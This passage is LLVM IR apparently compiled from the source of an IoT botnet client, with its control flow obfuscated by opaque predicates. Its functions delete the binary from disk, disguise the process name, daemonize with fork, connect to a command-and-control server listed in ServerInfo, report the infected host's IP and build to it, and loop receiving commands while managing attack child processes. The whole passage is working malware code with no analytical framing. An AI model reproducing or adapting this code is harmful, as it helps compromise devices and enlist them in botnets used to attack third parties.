  %257 = load i32, i32* %10, align 4
  %258 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %259 = call i32 @getsockname(i32 %257, %struct.sockaddr* %258, i32* %14) #3
  store i32 %259, i32* %12, align 4
  %260 = load i32, i32* %12, align 4
  %261 = icmp eq i32 %260, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %99
  %262 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  store i8* %262, i8** %17, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %117
  %263 = load i8*, i8** %17, align 8
  %264 = load i8, i8* %263, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp ne i32 %265, 9
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  %267 = load i32, i32* %18, align 4
  %_ = sub i32 %267, 1
  %gen = mul i32 %_, 1
  %_19 = shl i32 %267, 1
  %_20 = sub i32 0, %267
  %gen21 = add i32 %_20, 1
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %18, align 4
  br label %originalBB18

originalBB25alteredBB:                            ; preds = %originalBB25, %193
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %210
  %269 = load i32, i32* %10, align 4
  %270 = call i32 @close(i32 %269)
  br label %originalBB29
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %union.anon.6, align 4
  %3 = bitcast %union.anon.6* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %union.anon.6* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %union.anon.6* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %union.anon.6* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %union.anon.6* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.164 to i32), i32* %1, align 4
  br label %34

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.165 to i32), i32* %1, align 4
  br label %34

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.166 to i32), i32* %1, align 4
  br label %34

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.167 to i32), i32* %1, align 4
  br label %34

; <label>:17:                                     ; preds = %0
  %18 = load i32, i32* @x.97
  %19 = load i32, i32* @y.98
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  store i32 ptrtoint ([8 x i8]* @.str.168 to i32), i32* %1, align 4
  %26 = load i32, i32* @x.97
  %27 = load i32, i32* @y.98
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2, %16, %15, %14, %13
  %35 = load i32, i32* %1, align 4
  ret i32 %35

originalBBalteredBB:                              ; preds = %originalBB, %17
  store i32 ptrtoint ([8 x i8]* @.str.168 to i32), i32* %1, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @KadenCommStock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @KadenCommStock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @KadenCommStock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @x.99
  %12 = load i32, i32* @y.100
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* @botnetServer, align 4
  %20 = add nsw i32 %19, 1
  %21 = sext i32 %20 to i64
  %22 = icmp eq i64 %21, 1
  %23 = load i32, i32* @x.99
  %24 = load i32, i32* @y.100
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* @botnetServer, align 4
  br label %51

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.99
  %34 = load i32, i32* @y.100
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %32
  %41 = load i32, i32* @botnetServer, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* @botnetServer, align 4
  %43 = load i32, i32* @x.99
  %44 = load i32, i32* @y.100
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart218, label %originalBB4alteredBB

originalBBpart218:                                ; preds = %originalBB4
  br label %51

; <label>:51:                                     ; preds = %originalBBpart218, %31
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %53 = load i32, i32* @botnetServer, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1 x i8*], [1 x i8*]* @ServerInfo, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i8* @strcpy(i8* %52, i8* %56) #3
  store i32 27, i32* %3, align 4
  %58 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %59 = call i8* @strchr(i8* %58, i32 58) #9
  %60 = icmp ne i8* %59, null
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %51
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %63 = call i8* @strchr(i8* %62, i32 58) #9
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = call i32 @atoi(i8* %64) #9
  store i32 %65, i32* %3, align 4
  %66 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %67 = call i8* @strchr(i8* %66, i32 58) #9
  store i8 0, i8* %67, align 1
  br label %68

; <label>:68:                                     ; preds = %61, %51
  %69 = load i32, i32* @x.99
  %70 = load i32, i32* @y.100
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %68
  %77 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %77, i32* @KadenCommStock, align 4
  %78 = load i32, i32* @KadenCommStock, align 4
  %79 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %80 = load i32, i32* %3, align 4
  %81 = call i32 @connectTimeout(i32 %78, i8* %79, i32 %80, i32 30)
  %82 = icmp ne i32 %81, 0
  %83 = load i32, i32* @x.99
  %84 = load i32, i32* @y.100
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %82, label %92, label %91

; <label>:91:                                     ; preds = %originalBBpart222
  store i32 1, i32* %1, align 4
  br label %109

; <label>:92:                                     ; preds = %originalBBpart222
  %93 = load i32, i32* @x.99
  %94 = load i32, i32* @y.100
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %92
  store i32 0, i32* %1, align 4
  %101 = load i32, i32* @x.99
  %102 = load i32, i32* @y.100
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %109

; <label>:109:                                    ; preds = %originalBBpart226, %91
  %110 = load i32, i32* @x.99
  %111 = load i32, i32* @y.100
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %109
  %118 = load i32, i32* %1, align 4
  %119 = load i32, i32* @x.99
  %120 = load i32, i32* @y.100
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  ret i32 %118

originalBBalteredBB:                              ; preds = %originalBB, %10
  %127 = load i32, i32* @botnetServer, align 4
  %_ = sub i32 0, %127
  %gen = add i32 %_, 1
  %_1 = sub i32 %127, 1
  %gen2 = mul i32 %_1, 1
  %_3 = shl i32 %127, 1
  %128 = add nsw i32 %127, 1
  %129 = sext i32 %128 to i64
  %130 = icmp eq i64 %129, 1
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %32
  %131 = load i32, i32* @botnetServer, align 4
  %_5 = shl i32 %131, 1
  %_6 = shl i32 %131, 1
  %_7 = sub i32 0, %131
  %gen8 = add i32 %_7, 1
  %_9 = shl i32 %131, 1
  %_10 = sub i32 0, %131
  %gen11 = add i32 %_10, 1
  %_12 = sub i32 %131, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 0, %131
  %gen15 = add i32 %_14, 1
  %_16 = shl i32 %131, 1
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* @botnetServer, align 4
  br label %originalBB4

originalBB20alteredBB:                            ; preds = %originalBB20, %68
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %133, i32* @KadenCommStock, align 4
  %134 = load i32, i32* @KadenCommStock, align 4
  %135 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %136 = load i32, i32* %3, align 4
  %137 = call i32 @connectTimeout(i32 %134, i8* %135, i32 %136, i32 30)
  %138 = icmp ne i32 %137, 0
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %92
  store i32 0, i32* %1, align 4
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %109
  %139 = load i32, i32* %1, align 4
  br label %originalBB28
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca [32 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [4096 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @unlink(i8* %27) #3
  call void @rand_init()
  %29 = call i32 @rand_next()
  %30 = urem i32 %29, 4
  %31 = add i32 %30, 3
  %32 = mul i32 %31, 4
  store i32 %32, i32* %8, align 4
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %34 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %33, i32 %34)
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %36
  store i8 0, i8* %37, align 1
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %42 = call i32 @util_strcpy(i8* %40, i8* %41)
  %43 = call i32 @rand_next()
  %44 = urem i32 %43, 6
  %45 = add i32 %44, 3
  %46 = mul i32 %45, 4
  store i32 %46, i32* %8, align 4
  %47 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %48 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %47, i32 %48)
  %49 = load i32, i32* %8, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %50
  store i8 0, i8* %51, align 1
  %52 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %53 = call i32 (i32, ...) @prctl(i32 15, i8* %52) #3
  %54 = call i64 @time(i64* null) #3
  %55 = call i32 @getpid() #3
  %56 = sext i32 %55 to i64
  %57 = xor i64 %54, %56
  %58 = trunc i64 %57 to i32
  call void @srand(i32 %58) #3
  call void @rand_init()
  %59 = call i32 @getOurIP()
  %60 = call i32 @fork() #3
  store i32 %60, i32* %9, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %2
  %63 = load i32, i32* %9, align 4
  %64 = call i32 @waitpid(i32 %63, i32* %11, i32 0)
  call void @exit(i32 0) #11
  unreachable

; <label>:65:                                     ; preds = %2
  %66 = load i32, i32* @x.101
  %67 = load i32, i32* @y.102
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %65
  %74 = load i32, i32* %9, align 4
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.101
  %77 = load i32, i32* @y.102
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %75, label %143, label %84

; <label>:84:                                     ; preds = %originalBBpart2
  %85 = call i32 @fork() #3
  store i32 %85, i32* %10, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %84
  call void @exit(i32 0) #11
  unreachable

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* @x.101
  %90 = load i32, i32* @y.102
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = load i32, i32* %10, align 4
  %98 = icmp ne i32 %97, 0
  %99 = load i32, i32* @x.101
  %100 = load i32, i32* @y.102
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %98, label %108, label %107

; <label>:107:                                    ; preds = %originalBBpart24
  br label %109

; <label>:108:                                    ; preds = %originalBBpart24
  br label %109

; <label>:109:                                    ; preds = %108, %107
  %110 = load i32, i32* @x.101
  %111 = load i32, i32* @y.102
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %109
  %118 = load i32, i32* @x.101
  %119 = load i32, i32* @y.102
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %126

; <label>:126:                                    ; preds = %originalBBpart28
  %127 = load i32, i32* @x.101
  %128 = load i32, i32* @y.102
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %126
  %135 = load i32, i32* @x.101
  %136 = load i32, i32* @y.102
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %144

; <label>:143:                                    ; preds = %originalBBpart2
  br label %144

; <label>:144:                                    ; preds = %143, %originalBBpart212
  %145 = load i32, i32* @x.101
  %146 = load i32, i32* @y.102
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %144
  %153 = load i32, i32* @x.101
  %154 = load i32, i32* @y.102
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %161

; <label>:161:                                    ; preds = %originalBBpart216
  %162 = load i32, i32* @x.101
  %163 = load i32, i32* @y.102
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %161
  %170 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0)) #3
  %171 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %172 = load i32, i32* @x.101
  %173 = load i32, i32* @y.102
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %180

; <label>:180:                                    ; preds = %691, %183, %originalBBpart220
  %181 = call i32 @initConnection()
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %180
  br label %180

; <label>:184:                                    ; preds = %180
  %185 = load i32, i32* @KadenCommStock, align 4
  %186 = call i8* @getBuildz()
  %187 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %188 = call i8* @inet_ntoa(i32 %187) #3
  %189 = call i8* @getBuild()
  %190 = call i32 @getEndianness()
  %191 = call i32 (i32, i8*, ...) @botnetPrint(i32 %185, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.170, i32 0, i32 0), i8* %186, i8* %188, i8* %189, i32 %190, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.171, i32 0, i32 0))
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  br label %192

; <label>:192:                                    ; preds = %originalBBpart2150, %369, %184
  %193 = load i32, i32* @KadenCommStock, align 4
  %194 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  %195 = call i32 @recvLine(i32 %193, i8* %194, i32 4096)
  store i32 %195, i32* %13, align 4
  %196 = icmp ne i32 %195, -1
  br i1 %196, label %197, label %691

; <label>:197:                                    ; preds = %192
  store i32 0, i32* %14, align 4
  br label %198

; <label>:198:                                    ; preds = %333, %197
  %199 = load i32, i32* %14, align 4
  %200 = sext i32 %199 to i64
  %201 = load i64, i64* @numpids, align 8
  %202 = icmp ult i64 %200, %201
  br i1 %202, label %203, label %336

; <label>:203:                                    ; preds = %198
  %204 = load i32*, i32** @pids, align 8
  %205 = load i32, i32* %14, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i32, i32* %204, i64 %206
  %208 = load i32, i32* %207, align 4
  %209 = call i32 @waitpid(i32 %208, i32* null, i32 1)
  %210 = icmp sgt i32 %209, 0
  br i1 %210, label %211, label %332

; <label>:211:                                    ; preds = %203
  %212 = load i32, i32* @x.101
  %213 = load i32, i32* @y.102
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %211
  %220 = load i32, i32* %14, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %16, align 4
  %222 = load i32, i32* @x.101
  %223 = load i32, i32* @y.102
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBBpart234, label %originalBB22alteredBB

originalBBpart234:                                ; preds = %originalBB22
  br label %230

; <label>:230:                                    ; preds = %262, %originalBBpart234
  %231 = load i32, i32* @x.101
  %232 = load i32, i32* @y.102
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %230
  %239 = load i32, i32* %16, align 4
  %240 = zext i32 %239 to i64
  %241 = load i64, i64* @numpids, align 8
  %242 = icmp ult i64 %240, %241
  %243 = load i32, i32* @x.101
  %244 = load i32, i32* @y.102
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %242, label %251, label %265

; <label>:251:                                    ; preds = %originalBBpart238
  %252 = load i32*, i32** @pids, align 8
  %253 = load i32, i32* %16, align 4
  %254 = zext i32 %253 to i64
  %255 = getelementptr inbounds i32, i32* %252, i64 %254
  %256 = load i32, i32* %255, align 4
  %257 = load i32*, i32** @pids, align 8
  %258 = load i32, i32* %16, align 4
  %259 = sub i32 %258, 1
  %260 = zext i32 %259 to i64
  %261 = getelementptr inbounds i32, i32* %257, i64 %260
  store i32 %256, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %251
  %263 = load i32, i32* %16, align 4
  %264 = add i32 %263, 1
  store i32 %264, i32* %16, align 4
  br label %230

; <label>:265:                                    ; preds = %originalBBpart238
  %266 = load i32, i32* @x.101
  %267 = load i32, i32* @y.102
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %265
  %274 = load i32*, i32** @pids, align 8
  %275 = load i32, i32* %16, align 4
  %276 = sub i32 %275, 1
  %277 = zext i32 %276 to i64
  %278 = getelementptr inbounds i32, i32* %274, i64 %277
  store i32 0, i32* %278, align 4
  %279 = load i64, i64* @numpids, align 8
  %280 = add i64 %279, -1
  store i64 %280, i64* @numpids, align 8
  %281 = load i64, i64* @numpids, align 8
  %282 = add i64 %281, 1
  %283 = mul i64 %282, 4
  %284 = call noalias i8* @malloc(i64 %283) #3
  %285 = bitcast i8* %284 to i32*
  store i32* %285, i32** %15, align 8
  store i32 0, i32* %16, align 4
  %286 = load i32, i32* @x.101
  %287 = load i32, i32* @y.102
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart269, label %originalBB40alteredBB

originalBBpart269:                                ; preds = %originalBB40
  br label %294

; <label>:294:                                    ; preds = %309, %originalBBpart269
  %295 = load i32, i32* %16, align 4
  %296 = zext i32 %295 to i64
  %297 = load i64, i64* @numpids, align 8
  %298 = icmp ult i64 %296, %297
  br i1 %298, label %299, label %312

; <label>:299:                                    ; preds = %294
  %300 = load i32*, i32** @pids, align 8
  %301 = load i32, i32* %16, align 4
  %302 = zext i32 %301 to i64
  %303 = getelementptr inbounds i32, i32* %300, i64 %302
  %304 = load i32, i32* %303, align 4
  %305 = load i32*, i32** %15, align 8
  %306 = load i32, i32* %16, align 4
  %307 = zext i32 %306 to i64
  %308 = getelementptr inbounds i32, i32* %305, i64 %307
  store i32 %304, i32* %308, align 4
  br label %309

; <label>:309:                                    ; preds = %299
  %310 = load i32, i32* %16, align 4
  %311 = add i32 %310, 1
  store i32 %311, i32* %16, align 4
  br label %294

; <label>:312:                                    ; preds = %294
  %313 = load i32, i32* @x.101
  %314 = load i32, i32* @y.102
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %312
  %321 = load i32*, i32** @pids, align 8
  %322 = bitcast i32* %321 to i8*
  call void @free(i8* %322) #3
  %323 = load i32*, i32** %15, align 8
  store i32* %323, i32** @pids, align 8
  %324 = load i32, i32* @x.101
  %325 = load i32, i32* @y.102
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %332

; <label>:332:                                    ; preds = %originalBBpart273, %203
  br label %333

; <label>:333:                                    ; preds = %332
